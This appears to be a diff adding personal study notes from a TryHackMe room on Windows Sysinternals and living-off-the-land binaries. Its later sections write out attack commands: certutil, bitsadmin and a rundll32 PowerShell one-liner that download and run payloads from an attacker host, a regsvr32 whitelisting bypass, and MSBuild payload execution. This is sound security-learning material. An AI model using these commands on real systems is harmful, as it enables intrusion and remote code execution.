@@ -1,0 +1,77 @@
+Windows Sysinternals : 
+    - tools to manage windows bypassing security
+    - need '-accepteula' as argument
+tools : 
+    AccessChk :
+        Helps system administrators check specified access for files, directories, Registry keys, global objects, and Windows services.
+    PsExec : 
+        A tool that executes programs on a remote system.
+    ADExplorer : 
+        An advanced Active Directory tool that helps to easily view and manage the AD database.
+    ProcDump : 
+        Monitors running processes for CPU spikes and the ability to dump memory for further analysis.
+    ProcMon : 
+        An essential tool for process monitoring.
+    TCPView : 
+        A tool that lists all TCP and UDP connections.
+    PsTools	:
+        The first tool designed in the Sysinternals suite to help list detailed information.
+    Portmon	:
+        Monitors and displays all serial and parallel port activity on a system.
+    Whois :
+        Provides information for a specified domain name or IP address.
+
+access : 
+    - web browser : https://live.sysinternals.com/ or \\live.sysinternals.com\tools
+    - windows share
+    - command line
+
+docs : 
+    - tryhackme room : https://tryhackme.com/room/btsysinternalssg (sysinternals)
+    - windows doc : https://docs.microsoft.com/en-us/sysinternals/resources/
+    - lolbas (like gtfobins) : https://lolbas-project.github.io/
+
+uses : 
+    - Arbitrary code execution
+    - File operations, including downloading, uploading, and copying files
+    - Compiling code
+    - Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon
+    - UAC bypass
+    - Dumping process memory
+    - DLL injection
+
+File operations : 
+    - certutil : 
+        - download : certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+        - encode/decode : certutil -<encode/decode> payload.exe Encoded-payload.txt
+    - bitsadmin : 
+        - download : bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
+    - findstr
+        - download file from smb : findstr /V dummystring \\MachineName\ShareFolder\payload.exe > c:\Windows\Temp\payload.exe
+
+File execution : 
+    - file explorer :
+        - execute binary : explorer.exe /root,"c:\Windows\Temp\payload.exe"
+    - wmic : 
+        - execute binary : wmic.exe process call create c:\Windows\Temp\payload.exe
+    - rundll32 :
+        - execute powershell,binary,JS : 
+            - JS: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
+            - JS + powershell : rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
+
+Application whitelisting bypass :
+    - regsrv32 :
+        - execute binary : regsvr32.exe c:\Windows\Temp\payload.dll
+        - execute binary : regsvr32.exe /s /n /u /i:http://example.com/file.sct c:\Windows\Temp\payload.dll
+
+File shortcut : 
+    - execute files using : 
+        - Rundll32
+        - Powershell
+        - Regsvr32
+        - Executable on disk
+    - powerlessshell : 
+        - source : https://github.com/Mr-Un1k0d3r/PowerLessShell.git
+        - syntax : 
+            kali : python2 PowerLessShell.py -type powershell -source payload.ps1 -output payload.csproj
+            target : c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Windows\Temp\payload.csproj
